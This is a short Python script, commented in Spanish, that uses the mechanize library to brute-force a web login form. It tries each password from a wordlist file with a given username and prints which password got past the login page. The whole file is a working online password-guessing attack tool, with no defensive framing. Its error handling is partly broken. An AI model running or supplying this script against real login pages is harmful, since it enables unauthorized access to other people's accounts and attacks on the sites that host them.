import mechanize

# Crear navegador.
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)


def bruteforce(user, passfile, url):
    user = user
    # Abrir URL.
    br.open(url)
    try:
        file = open(passfile, 'r')
    except Exception as e:
        print("Error, no se ha encontrado el passfile" + e.text)
    else:
        pass

    passwords = file.read().splitlines()
    for x in passwords:
        # Seleccionar formulario
        br.select_form(nr=0)
        # Rellenar los campos.
        br.form['user'] = user
        br.form['password'] = x
        # Enviar.
        resp = br.submit()
        # Verifica si la url de resp, sigue siendo /login.php
        if resp.geturl() == url:
            print(x + " Checked ----------------- NO")
        else:
            print(x + " Checked ----------------- SI valido para: " + user)
            break
